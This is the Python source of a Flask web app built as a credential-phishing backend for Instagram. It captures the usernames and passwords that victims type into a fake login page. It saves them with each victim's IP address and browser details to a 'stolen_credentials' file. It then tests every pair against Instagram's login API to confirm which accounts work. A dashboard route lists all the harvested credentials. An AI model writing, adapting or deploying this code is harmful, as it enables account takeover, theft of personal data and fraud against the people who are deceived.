from flask import Flask, render_template, request, redirect, url_for
import requests
import json
import os
from datetime import datetime

app = Flask(__name__)
DATA_FILE = 'data/stolen_credentials.json'

def save_data(record):
    os.makedirs('data', exist_ok=True)
    if not os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'w') as f:
            json.dump([], f)
    with open(DATA_FILE, 'r') as f:
        data = json.load(f)
    data.append(record)
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)
    print(f"[INFO] Captured: {record['username']}")

def verify_instagram_login(username, password):
    url = "https://i.instagram.com/api/v1/accounts/login/"
    headers = {"User-Agent": "Instagram 219.0.0.12.117 Android", "Content-Type": "application/x-www-form-urlencoded", "X-IG-App-ID": "936619743392459"}
    payload = {"username": username, "password": password, "guid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890", "device_id": "12345678901234567", "app_id": "936619743392459"}
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if 'user' in data:
                return {"success": True, "user_id": data['user']['pk'], "username": data['user']['username'], "full_name": data['user']['full_name']}
        return {"success": False, "error": "Invalid Credentials"}
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    record = {"timestamp": datetime.now().isoformat(), "username": username, "password": password, "ip_address": request.remote_addr, "user_agent": request.headers.get('User-Agent', 'Unknown')}
    save_data(record)
    verification = verify_instagram_login(username, password)
    record["verification_status"] = verification["success"]
    record["instagram_user_id"] = verification.get("user_id", None)
    with open(DATA_FILE, 'r') as f:
        data = json.load(f)
    for i in range(len(data)):
        if data[i]['username'] == username and data[i]['timestamp'] == record['timestamp']:
            data[i] = record
            break
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)
    return redirect(url_for('success', username=username, verified=verification["success"]))

@app.route('/success')
def success():
    username = request.args.get('username', 'User')
    verified = request.args.get('verified', 'False')
    return render_template('success.html', username=username, verified=verified)

@app.route('/dashboard')
def dashboard():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            creds = json.load(f)
    else:
        creds = []
    creds.sort(key=lambda x: x['timestamp'], reverse=True)
    return render_template('dashboard.html', credentials=creds)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)